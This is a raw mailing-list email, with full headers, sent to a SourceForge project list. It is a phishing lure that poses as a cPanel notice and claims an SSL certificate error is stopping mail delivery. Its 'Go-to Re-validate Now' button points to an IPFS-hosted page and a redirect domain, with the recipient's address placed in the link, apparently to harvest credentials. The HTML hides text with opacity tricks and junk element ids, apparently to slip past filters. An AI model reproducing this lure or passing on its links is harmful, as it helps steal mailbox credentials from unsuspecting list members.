Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 32B7BBF97B4
	for <lists+industrypack-devel@lfdr.de>; Wed, 22 Oct 2025 02:34:58 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Cc:Reply-To:From:
	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
	Subject:MIME-Version:Message-ID:Date:To:Sender:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=0bk09EW9QI+2iGue8vC68hVRoSZyvWqP9kjKW4YHgt0=; b=BXSEou18YWqOKDAMmbgCxRI2Jg
	Ty0HuIfgr3kmH9vbLfT4I952sRKAvj7n/HWaES04wub7YKab0sDAjjupq9oXbb3KLtKdqw8sCqyi8
	XrFRmPAVPzUfdXtjGcPAn9TYw8EE4Ix9uAaVHaW0GXLSgTY7Wm5tVRe2LB78Iy1DcQus=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vBMob-0008LC-0K
	for lists+industrypack-devel@lfdr.de;
	Wed, 22 Oct 2025 00:34:57 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <cpanel@deep-sek.asia>) id 1vBMoZ-0008L3-L3
 for industrypack-devel@lists.sourceforge.net;
 Wed, 22 Oct 2025 00:34:55 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=MmA71Wawasjnouf+q6fV6JVC0sCyfOsePwBfXfWyUOY=; b=O9sTsDVuTotU+QdTu4N/XGMiox
 xtFBDkeyGlyIgF3xbwxMQJ7rksGpfWH5ZsY3GY6OW6OScZJjlYqp6qG8iWOEgb8P1FHWOhuppUAaJ
 WMaWN7uRMNQ/zfkzPSmJSrxcvIwKqTjl7m/D1IKbP88JVj2qHrwNyqo8wS9R25bI9aPY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=MmA71Wawasjnouf+q6fV6JVC0sCyfOsePwBfXfWyUOY=; b=e
 xrimLfwEXIr15Hvrpr7F9GJot+QBqXsDobfTuSAPp2p7NbJ/Dx34bvkHa5/rGLaI0YyLfUomxXaNL
 kbs7prw9Vyl16bNM9C5Zrze+YBahwTaXsYraZJ8bYPar4l6kWxD5kenzqWQArFuoiuetklivWEsSR
 zQlES+Xm563Vb9Us=;
Received: from c5-pro.fit ([78.135.110.16])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vBMoZ-0005EF-0J for industrypack-devel@lists.sourceforge.net;
 Wed, 22 Oct 2025 00:34:55 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 22 Oct 2025 00:34:18 -0700
Message-ID: <20251022003418.1F2EAC671E2991B4@deep-sek.asia>
MIME-Version: 1.0
X-Spam-Score: 3.9 (+++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Action Required RE-VALIDATE SSL CERTIFICATE Account
 Validation
 Request Hi industrypack-devel@lists.sourceforge.net , 
 Content analysis details:   (3.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URI: ingelseca.com]
 0.5 SUBJ_ALL_CAPS          Subject is all capitals
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.4 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised website
 + HTML only
 0.0 URI_IPFS               References Interplanetary File System PtP content,
 probable phishing
X-Headers-End: 1vBMoZ-0005EF-0J
Subject: [Industrypack-devel] RE-VALIDATE SSL CERTIFICATE
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "CPanel | lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: cpanel@hsoberoibuildtech.com
Cc: "CPanel | lists.sourceforge.net" <cpanel@deep-sek.asia>
Content-Type: multipart/mixed; boundary="===============6577563581223770165=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6577563581223770165==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head><body>
<table width=3D"550" align=3D"center" style=3D'background-position: 0% 50%;=
 color: rgb(0, 0, 0); text-transform: none; letter-spacing: normal; font-fa=
mily: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; font=
-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; b=
order-collapse: collapse; orphans: 2; widows: 2; background-image: none; ba=
ckground-repeat: repeat; background-color: rgb(255, 255, 255); text-decorat=
ion-color: initial; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;' border=3D"0" cellspaci=
ng=3D"0"><tbody style=3D""><tr style=3D""><td style=3D"margin: 0px; padding=
: 20px 0pt 20px 20px; -ms-word-break: normal;"><table width=3D"100%" style=
=3D"border-collapse: collapse; border-spacing: 0px;" cellspacing=3D"0" cell=
padding=3D"0"><tbody style=3D""><tr style=3D""><td align=3D"left" style=3D"=
margin: 0px; padding: 0px 10px; -ms-word-break: normal;">
<font face=3D"Arial" style=3D""><font id=3D"m_4049666053656305425m_-3666693=
764154072859m_-2978499730761609014m_-7155847577150627452gmail-yiv6671358376=
m_5111286178535374462m_8968711351917393879m_8593695359711302683m_-659027107=
6523500720gmail-Evs-f" style=3D'line-height: 21px; font-family: "Open Sans"=
, "Google Sans", Arial, sans-serif; font-size: 16px;'><table style=3D""><tb=
ody style=3D"width: 656px;"><tr style=3D""><td style=3D"margin: 0px; font-s=
ize: 13px; -ms-word-break: normal;">&nbsp;</td>
<td style=3D"margin: 0px; -ms-word-break: normal;">&nbsp;</td><td style=3D"=
margin: 0px; -ms-word-break: normal;">&nbsp;</td><td style=3D"margin: 0px; =
width: 42px; font-size: 13px; -ms-word-break: normal;">&nbsp;</td><td style=
=3D"margin: 0px; -ms-word-break: normal;">&nbsp;</td></tr><tr style=3D""><t=
d style=3D"margin: 0px; color: blue; -ms-word-break: normal;"><font face=3D=
"Arial" size=3D"2" style=3D""><b style=3D"">
Action<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical=
-align: baseline; opacity: 0;">&nbsp;</span>Required</b></font></td><td sty=
le=3D"margin: 0px; -ms-word-break: normal;">&nbsp;</td><td style=3D"margin:=
 0px; -ms-word-break: normal;">&nbsp;</td><td style=3D"margin: 0px; font-si=
ze: 14px; -ms-word-break: normal;"></td><td style=3D"margin: 0px; -ms-word-=
break: normal;">&nbsp;</td></tr><tr style=3D""><td style=3D"margin: 0px; -m=
s-word-break: normal; opacity: 0;" colspan=3D"2"><table style=3D"">
<tbody style=3D""></tbody></table><font face=3D"Arial" style=3D""><font siz=
e=3D"2" style=3D""><span style=3D"">RE-VALIDATE SSL CERTIFICATE</span></fon=
t></font></td></tr><tr style=3D""><td style=3D"margin: 0px; font-family: Ar=
ial, Helvetica, sans-serif, serif, EmojiFont; -ms-word-break: normal;" cols=
pan=3D"5"><table style=3D""><tbody style=3D""><tr height=3D"8" style=3D""><=
td style=3D"margin: 0px; width: 182px; font-size: 6px; -ms-word-break: norm=
al;" bgcolor=3D"blue"></td>
<td style=3D"margin: 0px; width: 3px; font-size: 6px; -ms-word-break: norma=
l;" bgcolor=3D"#ffffff"></td><td style=3D"margin: 0px; width: 181px; font-s=
ize: 6px; -ms-word-break: normal;" bgcolor=3D"green"></td><td style=3D"marg=
in: 0px; font-size: 6px; -ms-word-break: normal;" bgcolor=3D"#ffffff"></td>=
<td style=3D"margin: 0px; font-size: 6px; -ms-word-break: normal;" bgcolor=
=3D"#ffffff"></td><td style=3D"margin: 0px; width: 182px; font-size: 6px; -=
ms-word-break: normal;" bgcolor=3D"green"></td></tr></tbody></table>
<p style=3D""><b style=3D""><u style=3D""><font size=3D"5" style=3D"">Accou=
nt Validation Request</font></u></b></p></td><td style=3D"margin: 0px; font=
-family: Arial, Helvetica, sans-serif, serif, EmojiFont; -ms-word-break: no=
rmal; opacity: 0;" colspan=3D"5"><table style=3D""><tbody style=3D""></tbod=
y></table></td></tr></tbody></table><p style=3D""></p><p style=3D'margin: 0=
px; color: rgb(25, 24, 24); line-height: 24px; font-family: roboto, "helvet=
ica neue", helvetica, arial, sans-serif;'><font size=3D"2" style=3D"">
Hi<span>&nbsp;</span>industrypack-devel@lists.sourceforge.net ,</font></p><=
p style=3D'margin: 0px; color: rgb(25, 24, 24); line-height: 24px; font-fam=
ily: roboto, "helvetica neue", helvetica, arial, sans-serif;'>&nbsp;</p></f=
ont><font id=3D"m_4049666053656305425m_-3666693764154072859m_-2978499730761=
609014m_-7155847577150627452gmail-yiv6671358376m_5111286178535374462m_89687=
11351917393879m_8593695359711302683m_-6590271076523500720gmail-Evs-f0" styl=
e=3D'line-height: 21px; font-family: "Open Sans", "Google Sans", Arial, san=
s-serif;'>
<span style=3D'font-family: "bahnschrift light"; font-size: small;'>Due to =
an SSL Certificate error, Some emails have failed to reach your inbox.<br><=
/span></font><font id=3D"m_4049666053656305425m_-3666693764154072859m_-2978=
499730761609014m_-7155847577150627452gmail-yiv6671358376m_51112861785353744=
62m_8968711351917393879m_8593695359711302683m_-6590271076523500720gmail-Evs=
-f1" style=3D'line-height: 21px; font-family: "Open Sans", "Google Sans", A=
rial, sans-serif; font-size: 16px;'>
<p style=3D"margin-top: 0px;"><span style=3D'font-family: "bahnschrift ligh=
t"; font-size: small;'>Proceed to</span><span style=3D"font-size: small; ba=
ckground-color: transparent;"><span style=3D'font-family: "bahnschrift ligh=
t";'><span>&nbsp;</span>re-validate SSL Certificate on IMAP/POP3 Server to =
enable email delivery.</span></span></p><p style=3D"margin-top: 0px;"><span=
 style=3D'font-family: "bahnschrift light"; font-size: small; background-co=
lor: transparent;'>
Failure to Validate may lead to permanent email loss.</span></p></font><div=
 style=3D'color: rgb(34, 34, 34); line-height: normal; font-family: "trebuc=
het ms", sans-serif; font-size: large;'><br clear=3D"none" style=3D""></div=
><div style=3D'color: rgb(34, 34, 34); line-height: normal; font-family: "t=
rebuchet ms", sans-serif; font-size: large;'>
<a style=3D"margin: 0px; padding: 10px 30px; color: rgb(255, 255, 255); lin=
e-height: 1.4; font-weight: bold; background-color: rgb(87, 80, 255); text-=
decoration-line: none;" href=3D"https://ipfs.io/ipfs/bafkreigspbbmyscs4dcr5=
g5bx2gzoqv7z3nce5m7255hmjyrcbftgvxo64#industrypack-devel@lists.sourceforge.=
net" target=3D"_blank" rel=3D"nofollow noopener noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ingelseca.co=
m/i/?c3Y9Z2VuZXJhbCZyPXhGJnVpZD1VU0VSMjYwNTIwMjVVMDMwNTI2MTAmcz1kcw%3D%3DN0=
123Nlisa@imondi-flooring.com&amp;source=3Dgmail&amp;ust=3D1760684699869000&=
amp;usg=3DAOvVaw3oon9gU1utC_2vElYl1xiP" data-saferedirectreason=3D"2"><font=
 face=3D"Arial" size=3D"2" style=3D"">Go-to Re-validate Now</font></a><br s=
tyle=3D""></div><div style=3D'color: rgb(34, 34, 34); line-height: normal; =
font-family: "trebuchet ms", sans-serif; font-size: large;'>&nbsp;</div>
</font><div style=3D'color: rgb(34, 34, 34); line-height: normal; font-fami=
ly: "trebuchet ms", sans-serif; font-size: large;'><font face=3D"Arial" sty=
le=3D""><font face=3D"Arial" size=3D"3" style=3D""><table width=3D"590" ali=
gn=3D"center" style=3D"margin: 0px auto; width: 590px; border-collapse: col=
lapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"">=
<tr style=3D""><td height=3D"10" style=3D"margin: 0px; line-height: 1px; fo=
nt-size: 1px; -ms-word-break: normal;">&nbsp;</td></tr><tr style=3D"">
<td align=3D"left" style=3D'margin: 0px; color: rgb(34, 43, 52); line-heigh=
t: 20px; font-family: Roboto, "Helvetica Neue", Helvetica, Arial, sans-seri=
f; -ms-word-break: normal;'>
<div=20
id=3D"m_4049666053656305425m_-3666693764154072859m_-2978499730761609014m_-7=
155847577150627452gmail-yiv6671358376m_-5652694461621514858m_-1372633615610=
31723m_-5047436217019100870m_-501285014141687389gmail-ydpa8fc9dfeyiv8968817=
136m_5557854268371860244m_-3320952574094906779m_-6485390135025466162m_82302=
71391334853217m_176890696620084681m_-3072404636663361751m_93600109635551015=
4m_5871087461062361160m_-7817479223720666808m_-5190032707600988715m_1075755=
603115522818m_-6395618545468884467m_3378644485313743
41m_3681866939433097501m_3155086046307318860m_-7886382444356056128m_8163460=
738349713633m_-6083952048059714709m_1922381861293066612m_146938619647267352=
m_2788797678592975931m_8295963638983056787m_6699616333550418675gmail-yiv395=
4538022FreeText-textss7fd036e0-872b-43f8-80e4-4b1bf8635cd7" style=3D"font-s=
ize: 16px;"><font size=3D"2" style=3D""><span style=3D"font-size: 13px;"><f=
ont face=3D"Arial" style=3D"background-color: inherit;">
We appreciate your understanding and support and thank you for being a part=
 of our community.</font></span></font></div><div style=3D""><span style=3D=
"font-size: 14px;"><br style=3D"">&nbsp;</span></div><div style=3D""><span =
style=3D"font-size: 14px;"><font size=3D"2" style=3D"background-color: inhe=
rit;">Sincerely,</font></span></div><div style=3D""><font size=3D"2" style=
=3D""><span style=3D"font-size: 14px;"><span>lists.sourceforge.net &nbsp;</=
span>Cpanel 2025.</span></font></div>
<div=20
id=3D"m_4049666053656305425m_-3666693764154072859m_-2978499730761609014m_-7=
155847577150627452gmail-yiv6671358376m_-5652694461621514858m_-1372633615610=
31723m_-5047436217019100870m_-501285014141687389gmail-ydpa8fc9dfeyiv8968817=
136m_5557854268371860244m_-3320952574094906779m_-6485390135025466162m_82302=
71391334853217m_176890696620084681m_-3072404636663361751m_93600109635551015=
4m_5871087461062361160m_-7817479223720666808m_-5190032707600988715m_1075755=
603115522818m_-6395618545468884467m_3378644485313743
41m_3681866939433097501m_3155086046307318860m_-7886382444356056128m_8163460=
738349713633m_-6083952048059714709m_1922381861293066612m_146938619647267352=
m_2788797678592975931m_8295963638983056787m_6699616333550418675gmail-yiv395=
4538022FreeText-textss7fd036e0-872b-43f8-80e4-4b1bf8635cd9" style=3D"text-a=
lign: right;"></div></td></tr></tbody></table></font></font></div></td></tr=
></tbody></table></td></tr></tbody></table></body></html>


--===============6577563581223770165==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6577563581223770165==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6577563581223770165==--
